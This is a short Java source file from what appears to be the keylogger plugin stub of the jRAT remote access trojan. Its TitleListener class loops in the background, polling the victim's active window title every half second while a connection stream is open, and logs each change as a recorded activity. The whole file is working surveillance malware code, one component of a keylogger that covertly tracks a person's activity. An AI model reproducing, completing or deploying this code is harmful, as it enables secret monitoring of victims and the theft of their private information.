package jrat.plugin.keylogger.stub;

import jrat.plugin.keylogger.stub.activities.Activities;
import jrat.plugin.keylogger.stub.activities.Title;
import nativewindowlib.NativeWindow;
import nativewindowlib.WindowUtils;

public class TitleListener implements Runnable {

	private static String latest;

	@Override
	public void run() {
		try {
			Thread.sleep(1000L);
			
			while (true) {
				if (KeyloggerPlugin.dos != null) {					
					NativeWindow window = WindowUtils.getActiveWindow();
					
					String title = window.getTitle();
					
					if (latest == null || latest != null && !title.equals(latest)) {
						Activities.add(new Title(title));
					}
					
					latest = title;				
				}
				Thread.sleep(500L);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
